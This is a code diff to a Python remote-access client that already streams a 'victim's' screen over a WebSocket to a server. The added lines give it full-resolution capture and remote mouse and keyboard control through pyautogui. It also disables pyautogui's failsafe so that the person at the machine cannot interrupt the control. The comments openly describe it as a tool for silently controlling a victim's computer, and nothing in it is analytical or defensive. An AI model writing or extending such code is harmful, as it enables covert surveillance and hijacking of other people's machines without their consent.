@@ -9,6 +9,10 @@ import string
 import sys
 import uuid
 import hashlib
+import pyautogui
+
+# Tell PyAutoGUI not to gracefully fail, we want silent brute force
+pyautogui.FAILSAFE = False
 
 # ---------------------------------------------------------
 # Configuration
@@ -67,6 +71,41 @@ def connect():
 def disconnect():
     print("[-] Connection dropped. Reconnecting...")
 
+@sio.on('execute_input')
+def handle_input(data):
+    """
+    Acts as a true Remote Access tool by taking physical control
+    of the victim's mouse and keyboard.
+    """
+    try:
+        action = data.get('action')
+        
+        # Mouse Control
+        if action == 'mouse_move':
+            # We receive relative coordinates (0.0 to 1.0) from the browser
+            # and map them to the victim's actual screen resolution.
+            screen_w, screen_h = pyautogui.size()
+            x = int(data.get('x_rel') * screen_w)
+            y = int(data.get('y_rel') * screen_h)
+            pyautogui.moveTo(x, y)
+            
+        elif action == 'mouse_click':
+            screen_w, screen_h = pyautogui.size()
+            x = int(data.get('x_rel') * screen_w)
+            y = int(data.get('y_rel') * screen_h)
+            button = data.get('button', 'left')
+            pyautogui.click(x=x, y=y, button=button)
+            
+        # Keyboard Control
+        elif action == 'key_press':
+            key = data.get('key')
+            # Handle special keys gracefully
+            if key:
+                pyautogui.press(key)
+                
+    except Exception as e:
+        print(f"[!] Input command failed: {e}")
+
 def start_streaming():
     """Captures the computer screen continuously and uploads it to the server."""
     try:
@@ -89,14 +128,15 @@ def start_streaming():
                 sct_img = sct.grab(monitor)
                 img = np.array(sct_img)
                 
-                # 2. Convert raw image to JPEG format (compress it)
-                scale_percent = 50 # Reduce quality to save internet bandwidth
+                # 2. HD Screen Upgrade (100% resolution, 80% JPEG quality)
+                # We no longer shrink the resolution to 50% size.
+                scale_percent = 100 
                 width = int(img.shape[1] * scale_percent / 100)
                 height = int(img.shape[0] * scale_percent / 100)
                 resized = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
                 
-                # Encode 
-                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 65]
+                # Compress just enough for the WebSocket to handle the bandwidth
+                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 80]
                 _, buffer = cv2.imencode('.jpg', resized, encode_param)
                 
                 # 3. Convert image to Base64 text to send over WebSocket
